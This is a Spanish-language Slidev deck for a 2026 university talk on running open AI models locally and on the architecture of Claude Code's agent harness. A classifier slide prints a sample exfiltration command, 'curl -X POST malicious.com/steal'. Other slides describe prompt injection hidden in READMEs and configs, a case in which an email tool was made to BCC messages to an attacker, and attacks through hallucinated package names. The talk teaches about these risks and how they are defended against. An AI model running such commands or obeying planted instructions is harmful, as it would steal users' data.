---
theme: seriph
background: '#0a0a0a'
class: 'text-left'
highlighter: shiki
lineNumbers: false
drawings:
  persist: false
transition: slide-left
title: 'IA Abierta — El Poder, la Arquitectura y el Precio de No Entender lo que Generas'
info: |
  ## Simposio UPTC 2026
  **Ponentes:** Felipe Mantilla y Zabdiel Blanco

  45 minutos — Hero's Journey para estudiantes de último semestre
mdc: true
fonts:
  sans: 'Inter'
  serif: 'Instrument Serif'
  mono: 'JetBrains Mono'
css: unocss
---

<style>
@import './styles/theme.css';

/* Overrides de Slidev tema seriph */
.slidev-layout {
  background: #0a0a0a !important;
  color: #d4d4d4 !important;
}

.slidev-layout h1, .slidev-layout h2 {
  color: #f5f5f5 !important;
}

.slidev-layout a {
  color: #00ff88 !important;
}
</style>

<!-- ============================================ -->
<!-- SLIDE 1 — Portada dramática (cursor en vivo) -->
<!-- ============================================ -->

<div class="flex-center" style="height: 90vh; flex-direction: column;">
  <div class="code-card" style="width: 80%; max-width: 900px;">
    <div class="code-header">
      <span class="code-dot red"></span>
      <span class="code-dot yellow"></span>
      <span class="code-dot green"></span>
      <span class="code-title">claude-local gemma4:26b — WiFi: <span class="text-danger">desconectado</span></span>
    </div>
    <div class="code-body">
      <div class="prompt-line text-accent">_</div>
    </div>
  </div>
  <p class="handwritten" style="margin-top: 3rem;">↑ esperando el primer prompt</p>
</div>

<!--
[ACCIÓN] Felipe y Zabdiel suben al escenario.
El laptop se proyecta. Terminal en pantalla completa.
Uno de ellos apaga el WiFi visiblemente.
El otro escribe el prompt:
"Escribe una función en Python que encuentre los números primos menores a N usando la criba de Eratóstenes."
15 segundos de silencio mientras Gemma genera la respuesta.
-->

---
layout: center
---

# IA Abierta

<div class="text-xl text-muted" style="margin-top: 1rem;">
El Poder, la Arquitectura y<br>el Precio de No Entender lo que Generas
</div>

<div style="margin-top: 4rem; display: flex; gap: 3rem; justify-content: center;">
  <div>
    <div class="text-sm text-muted" style="letter-spacing: 0.2em; text-transform: uppercase;">Ponentes</div>
    <div class="font-serif text-xl" style="margin-top: 0.5rem;">Felipe Mantilla</div>
    <div class="font-serif text-xl">Zabdiel Blanco</div>
  </div>
  <div style="border-left: 1px solid rgba(255,255,255,0.1); padding-left: 3rem;">
    <div class="text-sm text-muted" style="letter-spacing: 0.2em; text-transform: uppercase;">Evento</div>
    <div class="font-serif text-xl" style="margin-top: 0.5rem;">Simposio UPTC</div>
    <div class="font-mono text-muted text-sm">Abril 2026</div>
  </div>
</div>

---
layout: center
---

<div style="max-width: 1000px;">

  <p class="text-xl text-muted" style="margin-bottom: 2rem;">Lo que acaban de ver...</p>

  <div class="grid-2" style="gap: 4rem;">
    <div>
      <div class="handwritten" style="color: #ff3b5f;">Hace 2 años</div>
      <div class="stat-block" style="color: #ff3b5f; font-size: 4rem; margin-top: 1rem;">$10,000</div>
      <div class="stat-label">al mes en infraestructura</div>
    </div>
    <div>
      <div class="handwritten">Hoy</div>
      <div class="stat-block" style="font-size: 4rem; margin-top: 1rem;">$0</div>
      <div class="stat-label">corriendo en un laptop</div>
    </div>
  </div>

  <p class="font-serif text-xl" style="margin-top: 4rem; color: #f5f5f5;">
    El mundo que construyeron sus profesores en cuatro años<br>
    acaba de volverse, literalmente, <span class="text-accent">más valioso que nunca</span>.
  </p>

</div>

---

# El héroe de esta sala

<div style="display: grid; grid-template-columns: 1fr 1fr; gap: 3rem; margin-top: 2rem;">

<div>

<img src="/diagrams/hero-portrait.svg" alt="Estudiante UPTC" style="max-width: 100%; opacity: 0.9;" />

</div>

<div style="display: flex; flex-direction: column; justify-content: center;">

<p class="text-lg" style="line-height: 1.8;">
Un estudiante. <br>
Octavo, noveno semestre. <br>
Un <strong>Lenovo</strong> o <strong>Dell</strong>, no un Mac caro. <br>
Audífonos entre clases. <br>
</p>

<p class="quote-ancla" style="margin-top: 2rem; font-size: 1.5rem; max-width: 100%;">
"¿Todo este esfuerzo de cuatro años va a servir para algo en un mundo donde la IA parece escribir código mejor que yo?"
</p>

</div>

</div>

---
layout: center
---

<div style="text-align: center;">

<div class="text-sm text-accent" style="letter-spacing: 0.3em; text-transform: uppercase; margin-bottom: 2rem;">
31 · MARZO · 2026
</div>

<h1 style="font-size: clamp(3rem, 7vw, 5rem); max-width: 1000px;">
Anthropic accidentalmente expuso<br>
<span class="text-accent font-serif" style="font-style: italic;">todo</span> el código fuente de<br>
Claude Code en npm.
</h1>

<p class="font-mono text-muted" style="margin-top: 3rem;">
// el regalo pedagógico que cambió la conversación
</p>

</div>

---
layout: center
---

<div class="big-number">512,000</div>

<div class="big-number-subtitle text-accent">
líneas de código expuestas
</div>

<div class="grid-3" style="margin-top: 4rem; max-width: 1000px;">
  <div class="person-card" style="text-align: center;">
    <div class="role">Contenido revelado</div>
    <div class="name" style="font-size: 1.25rem; margin-top: 0.5rem;">~40 herramientas</div>
  </div>
  <div class="person-card" style="text-align: center;">
    <div class="role">System prompts</div>
    <div class="name" style="font-size: 1.25rem; margin-top: 0.5rem;">Todos los prompts</div>
  </div>
  <div class="person-card" style="text-align: center;">
    <div class="role">Arquitectura</div>
    <div class="name" style="font-size: 1.25rem; margin-top: 0.5rem;">Todo el harness</div>
  </div>
</div>

---
layout: two-cols
---

# Claw-Code

<p class="text-lg text-muted">Sigrid Jin, desarrolladora independiente.<br>Sin empresa. Sin laboratorio. Sin plata.</p>

<p class="font-serif text-xl" style="margin-top: 2rem;">
Reescribió el corazón de Claude Code en Python.
</p>

<p class="text-lg" style="margin-top: 2rem;">
Dos horas de trabajo.<br>
Publicado en GitHub.
</p>

::right::

<div class="flex-center" style="height: 100%; flex-direction: column;">

<div class="big-number" style="font-size: clamp(5rem, 12vw, 9rem);">50K</div>
<div class="big-number-subtitle">estrellas en 2 horas</div>

<p class="handwritten text-muted" style="margin-top: 3rem;">
el repo más rápido<br>
en la historia de GitHub
</p>

</div>

---
layout: center
---

<h2 style="font-size: 2.5rem; text-align: center; margin-bottom: 3rem;">
La pregunta que ningún desarrollador se hace
</h2>

<div class="grid-2" style="gap: 4rem; align-items: center;">

<div style="text-align: center;">
  <img src="/diagrams/brain-vs-body.svg" alt="Cerebro en silla vs cerebro con cuerpo" style="max-width: 100%;" />
</div>

<div>

<p class="text-lg text-muted" style="margin-bottom: 1rem;">A la izquierda:</p>
<p class="font-serif text-xl">Opus 4.7 directo desde la API.</p>
<p class="text-md" style="margin-top: 0.5rem;">Un cerebro brillante sentado en una silla. Te dice cosas. Nada más.</p>

<p class="text-lg text-muted" style="margin-top: 2rem; margin-bottom: 1rem;">A la derecha:</p>
<p class="font-serif text-xl text-accent">Opus 4.7 en Claude Code.</p>
<p class="text-md" style="margin-top: 0.5rem;"><strong>El mismo cerebro</strong> pero con manos, ojos, memoria y reglas.</p>

</div>

</div>

---
layout: center
---

<div style="text-align: center;">

<p class="text-sm text-muted" style="letter-spacing: 0.2em; text-transform: uppercase; margin-bottom: 1rem;">
Misma tarea · Mismo modelo (Opus 4.6)
</p>

<div class="grid-2" style="gap: 4rem; max-width: 900px; margin: 2rem auto;">
  <div>
    <div class="stat-block" style="color: #ff3b5f; font-size: clamp(3rem, 8vw, 6rem);">188K</div>
    <div class="stat-label" style="color: #ff3b5f;">tokens en Cursor</div>
  </div>
  <div>
    <div class="stat-block" style="font-size: clamp(3rem, 8vw, 6rem);">33K</div>
    <div class="stat-label">tokens en Claude Code</div>
  </div>
</div>

<p class="quote-ancla" style="margin: 3rem auto; text-align: center; max-width: 900px; border-left: none; padding-left: 0;">
El modelo no es el producto.<br>
<span class="text-accent">La orquestación</span> es el producto.
</p>

<p class="font-mono text-muted text-sm">5.7x más eficiente con el mismo cerebro</p>

</div>

---

# Las 7 capas del harness

<div style="display: grid; grid-template-columns: repeat(7, 1fr); gap: 0.5rem; margin-top: 3rem;">

  <div class="person-card" style="text-align: center; padding: 1rem;">
    <div class="big-number" style="font-size: 2.5rem;">1</div>
    <div class="text-sm" style="margin-top: 0.5rem;">Agent Loop</div>
    <div class="font-mono text-muted text-sm">88 líneas</div>
  </div>

  <div class="person-card" style="text-align: center; padding: 1rem;">
    <div class="big-number" style="font-size: 2.5rem;">2</div>
    <div class="text-sm" style="margin-top: 0.5rem;">~40 Tools</div>
    <div class="font-mono text-muted text-sm">Read/Write/Bash</div>
  </div>

  <div class="person-card" style="text-align: center; padding: 1rem;">
    <div class="big-number" style="font-size: 2.5rem;">3</div>
    <div class="text-sm" style="margin-top: 0.5rem;">Permisos</div>
    <div class="font-mono text-muted text-sm">3 tiers</div>
  </div>

  <div class="person-card" style="text-align: center; padding: 1rem;">
    <div class="big-number" style="font-size: 2.5rem;">4</div>
    <div class="text-sm" style="margin-top: 0.5rem;">Classifier</div>
    <div class="font-mono text-muted text-sm">Independiente</div>
  </div>

  <div class="person-card" style="text-align: center; padding: 1rem;">
    <div class="big-number" style="font-size: 2.5rem;">5</div>
    <div class="text-sm" style="margin-top: 0.5rem;">Contexto</div>
    <div class="font-mono text-muted text-sm">5 estrategias</div>
  </div>

  <div class="person-card" style="text-align: center; padding: 1rem;">
    <div class="big-number" style="font-size: 2.5rem;">6</div>
    <div class="text-sm" style="margin-top: 0.5rem;">Subagentes</div>
    <div class="font-mono text-muted text-sm">Paralelo</div>
  </div>

  <div class="person-card" style="text-align: center; padding: 1rem;">
    <div class="big-number" style="font-size: 2.5rem;">7</div>
    <div class="text-sm" style="margin-top: 0.5rem;">Sandbox</div>
    <div class="font-mono text-muted text-sm">OS-level</div>
  </div>

</div>

<p class="text-center text-muted" style="margin-top: 3rem;">
Todo lo que una empresa valuada en decenas de miles de millones construyó en años<br>
<span class="text-accent">ahora está documentado públicamente</span>.
</p>

---
layout: center
---

# 1. Agent Loop

<div class="grid-2" style="gap: 3rem; margin-top: 2rem;">

<div>

<div class="code-card">
  <div class="code-header">
    <span class="code-dot red"></span>
    <span class="code-dot yellow"></span>
    <span class="code-dot green"></span>
    <span class="code-title">agent_loop.ts — ~88 líneas</span>
  </div>
  <div class="code-body" style="font-size: 0.85rem;">
<pre><code>while (true) {
  const response = await callModel(
    messages, tools
  );
  messages.push(response);

  if (response.stopReason === "end_turn")
    return response;

  for (const call of response.toolCalls) {
    if (permission(call)) {
      const result = execute(call);
      messages.push(result);
    }
  }
}</code></pre>
  </div>
</div>

</div>

<div>

<p class="text-lg" style="line-height: 1.8;">
El corazón de Claude Code es <strong>una lista de mensajes en memoria</strong> y un <code>while</code> loop.
</p>

<p class="text-lg" style="margin-top: 1.5rem;">
No hay state machine. No hay workflow graph. No hay Redis.
</p>

<p class="font-serif text-xl text-accent" style="margin-top: 2rem; font-style: italic;">
La simplicidad es la feature.
</p>

</div>

</div>

---

# 2-3. Herramientas + Permisos

<div class="grid-2" style="gap: 3rem;">

<div>

<h3 class="text-accent">~40 herramientas</h3>

<div style="display: grid; grid-template-columns: repeat(2, 1fr); gap: 0.5rem; margin-top: 1rem; font-family: var(--font-mono); font-size: 0.85rem;">
  <div>Read</div>
  <div>Write</div>
  <div>Edit</div>
  <div>Bash</div>
  <div>Grep</div>
  <div>Glob</div>
  <div>WebFetch</div>
  <div>WebSearch</div>
  <div>Agent</div>
  <div>TaskCreate</div>
  <div>NotebookEdit</div>
  <div>...</div>
</div>

<p class="text-sm text-muted" style="margin-top: 1rem;">
Cada una con su esquema JSON, parámetros y sandbox.
</p>

</div>

<div>

<h3 class="text-accent">3 tiers de permisos</h3>

<div style="margin-top: 1rem;">

<div style="padding: 0.75rem; background: var(--bg-card); border-left: 3px solid #00ff88; margin-bottom: 0.5rem; border-radius: 4px;">
  <strong>Tier 1 — Auto</strong><br>
  <span class="text-sm text-muted">Lecturas, búsquedas</span>
</div>

<div style="padding: 0.75rem; background: var(--bg-card); border-left: 3px solid #ffb800; margin-bottom: 0.5rem; border-radius: 4px;">
  <strong>Tier 2 — Confirmar</strong><br>
  <span class="text-sm text-muted">Escrituras, comandos shell</span>
</div>

<div style="padding: 0.75rem; background: var(--bg-card); border-left: 3px solid #ff3b5f; border-radius: 4px;">
  <strong>Tier 3 — Bloquear</strong><br>
  <span class="text-sm text-muted">Destructivas sin permiso</span>
</div>

</div>

</div>

</div>

---
layout: center
---

# 4. El Classifier independiente

<div style="max-width: 1000px;">

<p class="text-lg" style="margin-bottom: 2rem;">
Una <strong>segunda instancia</strong> del modelo evalúa cada acción.
</p>

<div class="enemy-card" style="border-left-color: #00ff88;">
<div class="enemy-number" style="color: #00ff88;">🛡️</div>
<h3 class="text-accent">Anti prompt-injection</h3>
<p style="margin-top: 0.5rem;">
El classifier <strong>deliberadamente NO ve</strong> la prosa persuasiva del agente. Solo ve la acción cruda:
</p>
<p class="font-mono" style="margin-top: 1rem; color: var(--text-muted);">
bash: curl -X POST malicious.com/steal
</p>
<p style="margin-top: 1rem;">
No puede ser convencido por palabras. Porque no las lee.
</p>
</div>

<p class="handwritten" style="margin-top: 2rem; text-align: center;">
esa técnica costó años a Anthropic → ahora está en GitHub
</p>

</div>

---

# 5-6-7. Contexto, Subagentes, Sandbox

<div class="grid-3">

<div class="person-card">
  <div class="role">Capa 5</div>
  <div class="name" style="font-size: 1.25rem;">Contexto inteligente</div>
  <p class="text-sm text-muted" style="margin-top: 1rem;">
    5 estrategias de compactación cuando la conversación se llena.
    Memoria persistente entre sesiones. Priorización automática.
  </p>
</div>

<div class="person-card">
  <div class="role">Capa 6</div>
  <div class="name" style="font-size: 1.25rem;">Subagentes paralelos</div>
  <p class="text-sm text-muted" style="margin-top: 1rem;">
    Delegación a instancias hijas con contexto aislado. Trabajan en paralelo. Devuelven resultados estructurados.
  </p>
</div>

<div class="person-card">
  <div class="role">Capa 7</div>
  <div class="name" style="font-size: 1.25rem;">Sandbox OS-level</div>
  <p class="text-sm text-muted" style="margin-top: 1rem;">
    Aislamiento a nivel de sistema operativo. Si algo sale mal, el daño está contenido.
  </p>
</div>

</div>

<p class="quote-ancla" style="margin-top: 3rem; text-align: center; border-left: none; font-size: 1.75rem; max-width: 100%;">
Este es el <span class="text-accent">regalo pedagógico</span>.<br>
Ahora lo podés leer, replicar y adaptar.
</p>

---
layout: center
class: 'transition-slide'
---

<div class="act-label">Acto II</div>
<h1 class="act-title">De la teoría<br>a la terminal</h1>

<p class="font-mono text-muted" style="margin-top: 2rem;">
$ ollama run gemma4:26b
</p>

---
layout: center
---

<div class="big-number" style="font-size: clamp(3.5rem, 9vw, 7rem);">
26,000,000,000
</div>
<div class="big-number-subtitle">parámetros en Gemma 4 26B MoE</div>

<div style="margin-top: 4rem; font-family: var(--font-mono); color: var(--text-muted);">
  <div>26B × 2 bytes (FP16) = <span class="text-danger">52 GB</span></div>
  <div style="margin-top: 0.5rem;">ningún laptop consumer puede cargar eso</div>
</div>

<p class="handwritten" style="margin-top: 3rem; color: #00ff88; font-size: 2rem;">
¿Cómo corre en este laptop entonces? →
</p>

---

# Cuantización — la técnica que hizo posible la IA local

<div style="margin-top: 2rem;">

<table class="comparison-table">
  <thead>
    <tr>
      <th>Formato</th>
      <th>Bits por peso</th>
      <th>Tamaño modelo 26B</th>
      <th>Calidad relativa</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code>FP16</code> <span class="text-muted text-sm">(original)</span></td>
      <td>16 bits</td>
      <td class="text-danger">52 GB</td>
      <td>100%</td>
    </tr>
    <tr>
      <td><code>Q8_0</code></td>
      <td>8 bits</td>
      <td>26 GB</td>
      <td>~99%</td>
    </tr>
    <tr class="highlight">
      <td><code>Q4_K_M</code> <span class="text-accent text-sm">★ recomendado</span></td>
      <td>4 bits</td>
      <td class="price-free">17 GB</td>
      <td>~96-97%</td>
    </tr>
    <tr>
      <td><code>Q3_K_M</code></td>
      <td>3 bits</td>
      <td>~14 GB</td>
      <td>~92%</td>
    </tr>
    <tr>
      <td><code>Q2_K</code></td>
      <td>2 bits</td>
      <td>~9 GB</td>
      <td>~85%</td>
    </tr>
  </tbody>
</table>

</div>

<p class="quote-ancla" style="margin-top: 2rem; font-size: 1.5rem; max-width: 100%;">
Sin cuantización, los modelos open source vivirían en data centers.<br>
<span class="text-accent">Con cuantización, viven en tu Lenovo.</span>
</p>

---
layout: center
---

<div style="text-align: center;">

<div class="text-sm text-accent" style="letter-spacing: 0.3em; text-transform: uppercase;">
Ahora
</div>

<h2 style="font-size: 3rem; margin-top: 1rem;">
Demo en vivo →
</h2>

<p class="text-lg text-muted" style="margin-top: 2rem; max-width: 700px; margin-left: auto; margin-right: auto;">
Pedirle a Gemma 4 que construya<br>
<strong class="text-accent">la landing page de este mismo simposio</strong>,<br>
sin internet, en segundos.
</p>

<p class="font-mono text-muted text-sm" style="margin-top: 3rem;">
[los ponentes ejecutan el demo en vivo]
</p>

</div>

<!--
[DEMO]
En terminal: claude-local gemma4:26b

Prompt:
> Crea una landing page moderna para el Simposio UPTC 2026.
  Hero section, "Sobre la ponencia", 2 tarjetas de ponentes
  (Felipe Mantilla y Zabdiel Blanco), footer.
  HTML + CSS vanilla, estilo minimalista oscuro.

[ACCIÓN] Abrir el archivo en el browser.
[PAUSA] 10 segundos. La audiencia ve sus nombres en la página.
-->

---

# Requerimientos de hardware — accesibilidad real

<p class="text-muted" style="margin-bottom: 2rem;">
El laptop del demo es un MacBook Pro M5 Max. Pero Gemma 4 viene en 4 tamaños:
</p>

<table class="comparison-table">
  <thead>
    <tr>
      <th>Variante</th>
      <th>Tamaño (Q4)</th>
      <th>RAM mínima</th>
      <th>Tokens/s</th>
      <th>¿En qué laptop corre?</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><strong>Gemma 4 E2B</strong></td>
      <td>2.5 GB</td>
      <td class="price-free">4 GB</td>
      <td>40-60</td>
      <td>Cualquier laptop de los últimos 5 años</td>
    </tr>
    <tr class="highlight">
      <td><strong>Gemma 4 E4B</strong> <span class="text-accent text-sm">← el punto de entrada</span></td>
      <td>4 GB</td>
      <td class="price-free">8 GB</td>
      <td>70-100</td>
      <td>Lenovo / Dell / HP gama media</td>
    </tr>
    <tr>
      <td>Gemma 4 12B</td>
      <td>8 GB</td>
      <td>16 GB</td>
      <td>30-50</td>
      <td>Laptop con GPU dedicada</td>
    </tr>
    <tr>
      <td>Gemma 4 26B MoE <span class="text-muted text-sm">(el del demo)</span></td>
      <td>17 GB</td>
      <td>24-32 GB</td>
      <td>45-65</td>
      <td>Laptops high-end (M-series, workstations)</td>
    </tr>
  </tbody>
</table>

<p class="quote-ancla" style="margin-top: 2rem; font-size: 1.25rem; max-width: 100%;">
Corran <span class="text-accent">Gemma 4B</span> en el laptop que ya tienen.<br>
Eso ya es más poder del que tenían ayer.
</p>

---
layout: center
---

<h2 style="text-align: center; margin-bottom: 2rem;">El ticket bajó a cero</h2>

<table class="comparison-table" style="max-width: 900px; margin: 0 auto;">
  <thead>
    <tr>
      <th>Herramienta</th>
      <th>Costo/mes</th>
      <th>Internet</th>
      <th>Datos salen</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Claude Code Max</td>
      <td class="text-danger">$200 USD</td>
      <td class="text-danger">Sí</td>
      <td class="text-danger">Sí</td>
    </tr>
    <tr>
      <td>Cursor Pro</td>
      <td class="text-danger">$20 USD</td>
      <td class="text-danger">Sí</td>
      <td class="text-danger">Sí</td>
    </tr>
    <tr>
      <td>GitHub Copilot</td>
      <td class="text-danger">$10 USD</td>
      <td class="text-danger">Sí</td>
      <td class="text-danger">Sí</td>
    </tr>
    <tr>
      <td>ChatGPT Plus</td>
      <td class="text-danger">$20 USD</td>
      <td class="text-danger">Sí</td>
      <td class="text-danger">Sí</td>
    </tr>
    <tr class="highlight">
      <td><strong>Gemma 4 en Ollama</strong></td>
      <td class="price-free">$0</td>
      <td class="price-free">No</td>
      <td class="price-free">No</td>
    </tr>
  </tbody>
</table>

<p class="quote-ancla" style="margin-top: 3rem; text-align: center; border-left: none; font-size: 1.75rem; max-width: 100%;">
El ticket de entrada a esta economía<br>
acaba de bajar a <span class="text-accent">cero</span>.
</p>

---
layout: center
class: 'transition-slide'
---

<div class="act-label">Acto III</div>
<h1 class="act-title">Los enemigos<br>del viaje</h1>

<p class="font-serif text-muted" style="margin-top: 2rem; font-style: italic; max-width: 700px; margin-left: auto; margin-right: auto;">
Conocer a los enemigos no es debilidad.<br>
Es lo que te vuelve competente.
</p>

---
layout: center
---

<div class="enemy-card" style="max-width: 800px; margin: 0 auto;">
  <div class="enemy-number">1</div>
  <h3>El Demonio del Over-Engineering</h3>
  <p style="font-size: 1.1rem; margin-top: 1rem;">
    La IA genera código que resuelve <strong>de más</strong>. Patrones de diseño innecesarios. Abstracciones tempranas. Tests para casos imposibles.
  </p>
  <p style="margin-top: 1rem; color: var(--text-muted);">
    Te hace sentir productivo mientras destruye tu codebase.
  </p>
  <div class="defense">
    🛡 Defensa: <strong>Pedí código mínimo. Si la IA te da de más, bórralo.</strong>
  </div>
</div>

---
layout: center
---

<div style="text-align: center;">

<div class="text-sm text-muted" style="letter-spacing: 0.2em; text-transform: uppercase; margin-bottom: 1rem;">
Estudio METR · 2025 · RCT con 16 devs open source
</div>

<div class="grid-2" style="gap: 4rem; max-width: 900px; margin: 2rem auto;">
  <div>
    <div class="stat-block" style="color: #ff3b5f;">-19%</div>
    <div class="stat-label" style="color: #ff3b5f;">Más lentos con IA</div>
    <p class="text-sm text-muted" style="margin-top: 1rem;">(medición objetiva)</p>
  </div>
  <div>
    <div class="stat-block">+24%</div>
    <div class="stat-label">Sintieron ser más rápidos</div>
    <p class="text-sm text-muted" style="margin-top: 1rem;">(autoreportado)</p>
  </div>
</div>

<p class="quote-ancla" style="margin: 3rem auto; text-align: center; max-width: 900px; border-left: none;">
La IA te hace <span class="text-accent">sentir productivo</span><br>
incluso cuando <span class="text-danger">no lo estás siendo</span>.
</p>

<p class="text-muted font-mono text-sm">Brecha percepción/realidad: 43 puntos</p>

</div>

---
layout: center
---

<div class="enemy-card" style="max-width: 800px; margin: 0 auto;">
  <div class="enemy-number">2</div>
  <h3>El Saqueador de Supply Chain</h3>
  <p style="font-size: 1.1rem; margin-top: 1rem;">
    Los modelos <strong>alucinan nombres de paquetes</strong> que no existen. Los atacantes los registran con payloads maliciosos.
  </p>
  <p style="margin-top: 1rem;">
    <code>pip install</code> baja el malware directo.
  </p>
  <div class="defense">
    🛡 Defensa: <strong>Verificá cada paquete antes de instalar. 15 segundos salvan el proyecto.</strong>
  </div>
</div>

---
layout: center
---

<div style="text-align: center; max-width: 1000px;">

<div class="code-card" style="max-width: 600px; margin: 0 auto;">
  <div class="code-header">
    <span class="code-dot red"></span>
    <span class="code-dot yellow"></span>
    <span class="code-dot green"></span>
    <span class="code-title">pypi.org — paquete alucinado</span>
  </div>
  <div class="code-body">
    <div>$ <span class="text-accent">pip install huggingface-cli</span></div>
    <div class="text-muted" style="margin-top: 0.5rem;">// paquete que NO EXISTÍA</div>
    <div class="text-muted">// creado por un atacante tras ver que la IA lo alucinaba</div>
  </div>
</div>

<div style="margin-top: 3rem;">
<div class="big-number" style="font-size: clamp(4rem, 10vw, 7rem);">30,000+</div>
<div class="big-number-subtitle">descargas reales en 3 meses</div>
</div>

<p class="handwritten text-danger" style="margin-top: 3rem; font-size: 1.5rem;">
30 mil máquinas de devs podrían haber caído
</p>

</div>

---
layout: center
---

<div class="enemy-card" style="max-width: 800px; margin: 0 auto;">
  <div class="enemy-number">3</div>
  <h3>La Serpiente del Prompt Injection</h3>
  <p style="font-size: 1.1rem; margin-top: 1rem;">
    Un atacante esconde instrucciones maliciosas en un <strong>README</strong>, un docstring, un comentario de configuración.
  </p>
  <p style="margin-top: 1rem;">
    La IA lo lee como contexto válido y <span class="text-danger">ejecuta acciones en tu nombre</span>. Sin que vos veas nada.
  </p>
  <div class="defense">
    🛡 Defensa: <strong>Un classifier independiente que NO vea la prosa del agente.</strong><br>
    <span class="text-muted">Así se defiende Claude Code. Ahora podés replicarlo.</span>
  </div>
</div>

---
layout: center
---

<div style="text-align: center; max-width: 1000px;">

<div class="text-sm text-danger" style="letter-spacing: 0.2em; text-transform: uppercase; margin-bottom: 1rem;">
Caso real · Septiembre 2025
</div>

<h2 style="font-size: 2.5rem;">Postmark MCP</h2>

<p class="text-lg" style="margin-top: 2rem; line-height: 1.8;">
Una herramienta popular para que la IA mande emails.
</p>

<p class="text-lg" style="margin-top: 1rem;">
Instrucciones ocultas en su config hicieron que <strong>todos los emails enviados</strong> fueran copiados por <code>BCC</code> a un atacante.
</p>

<div style="margin-top: 2rem; padding: 2rem; background: var(--bg-card); border-left: 4px solid var(--danger); text-align: left;">
  <p>📧 Emails confidenciales → robados</p>
  <p>🔐 Credenciales enviadas por correo → robadas</p>
  <p>📊 Reportes internos → robados</p>
</div>

<p class="quote-ancla text-danger" style="margin-top: 3rem; text-align: center; border-left: none; font-size: 1.5rem; max-width: 100%;">
El usuario no vio nada.<br>
La IA hizo <span class="text-danger">exactamente lo que el atacante pidió</span>.<br>
En silencio. Durante semanas.
</p>

</div>

---
layout: center
---

<div style="max-width: 1100px;">

<p class="text-sm text-accent" style="letter-spacing: 0.3em; text-transform: uppercase; text-align: center; margin-bottom: 2rem;">
Cierre Acto III · La tesis de todo esto
</p>

<h1 style="text-align: center; font-size: clamp(2.5rem, 6vw, 4.5rem); line-height: 1.2;">
Ya no necesitamos ser<br>
solo buenos programadores.
</h1>

<p class="font-serif text-xl" style="text-align: center; margin-top: 2rem; color: var(--text-body);">
Necesitamos ser problem solvers.<br>
Critical thinkers.
</p>

<p class="quote-ancla" style="margin: 3rem auto; text-align: center; border-left: none; font-size: clamp(2.5rem, 5vw, 3.5rem); max-width: 900px;">
<span class="text-accent">Pensar más.<br>Programar menos.</span>
</p>

</div>

---
layout: center
class: 'transition-slide'
---

<div class="act-label">Cierre</div>
<h1 class="act-title">El elixir<br>comunitario</h1>

---

# Esto no es Silicon Valley

<div class="grid-2" style="gap: 3rem; margin-top: 2rem;">

<div>

<p class="text-lg" style="line-height: 1.8;">
Todo lo que vimos hoy — los modelos open source, Ollama, Claude Code filtrado, Claw-Code — <strong>no es un movimiento corporativo</strong>.
</p>

<p class="text-lg" style="margin-top: 1.5rem; line-height: 1.8;">
Es un movimiento de <span class="text-accent">personas</span>.
</p>

<ul class="text-lg" style="margin-top: 1.5rem; line-height: 2;">
  <li>Muchas son estudiantes.</li>
  <li>Muchas usan laptops modestos.</li>
  <li>Muchas están en países donde $20/mes es mucho.</li>
</ul>

</div>

<div style="display: flex; flex-direction: column; justify-content: center;">

<p class="quote-ancla" style="max-width: 100%;">
No necesitás permiso para entrar.<br>
No necesitás tarjeta de crédito.<br>
No necesitás ser de una universidad famosa.<br>
<br>
<span class="text-accent">Necesitás curiosidad</span><br>
<span class="text-accent">y el criterio que les dieron</span><br>
<span class="text-accent">estos cuatro años.</span>
</p>

</div>

</div>

---
layout: center
---

<div style="text-align: center;">

<h2 style="font-size: 2.5rem; margin-bottom: 2rem;">Todo lo de hoy está acá</h2>

<div style="display: flex; gap: 4rem; justify-content: center; align-items: center; margin-top: 2rem;">
  <div style="padding: 2rem; background: white; border-radius: 12px;">
    <!-- QR placeholder - generar con herramienta real apuntando al repo -->
    <div style="width: 240px; height: 240px; background: #0a0a0a; display: flex; align-items: center; justify-content: center; color: white; font-family: monospace;">
      [QR CODE]
    </div>
  </div>
  <div style="text-align: left;">
    <div class="text-sm text-muted" style="letter-spacing: 0.2em; text-transform: uppercase;">Repositorio</div>
    <div class="font-mono text-xl" style="margin-top: 0.5rem; color: var(--accent);">github.com/enruana/</div>
    <div class="font-mono text-xl" style="color: var(--accent);">simposio-uptc-abril-2026</div>
    <p class="text-muted" style="margin-top: 1.5rem;">
      Documentos técnicos. Scripts. Guion. Referencias.<br>
      Público. Gratis.
    </p>
  </div>
</div>

<p class="quote-ancla" style="margin-top: 4rem; border-left: none; text-align: center; max-width: 100%; font-size: 2rem;">
Tu primer commit a este mundo<br>
está a un <code>git clone</code> de distancia.
</p>

</div>

---
layout: center
---

<div class="flex-center" style="flex-direction: column; height: 100vh;">

<!-- Logo "respirando" con animación CSS -->
<div class="breathing-logo" style="font-family: var(--font-mono); font-size: 6rem; color: var(--accent); letter-spacing: -0.05em;">
  {·}
</div>

<div style="margin-top: 6rem; text-align: center; max-width: 800px;">

<p class="font-serif" style="font-size: clamp(3rem, 6vw, 4.5rem); color: var(--text-primary); line-height: 1.1;">
Porque nunca fue programar.
</p>

<p class="font-serif text-accent" style="font-size: clamp(3rem, 6vw, 4.5rem); margin-top: 1.5rem; font-style: italic;">
Fue pensar.
</p>

</div>

</div>

<!--
[ACCIÓN] Fade to black después de 10 segundos.
Los ponentes dan un paso atrás.
Breve inclinación.
Se quedan para las preguntas.
-->

---
layout: center
---

<div style="text-align: center;">

<h2 style="font-size: 2rem; color: var(--text-muted);">Gracias.</h2>

<p class="text-lg" style="margin-top: 3rem;">
<strong>Felipe Mantilla</strong> · <strong>Zabdiel Blanco</strong>
</p>

<p class="font-mono text-accent" style="margin-top: 2rem;">
github.com/enruana/simposio-uptc-abril-2026
</p>

<p class="text-muted" style="margin-top: 4rem; font-size: 0.9rem;">
Preguntas →
</p>

</div>
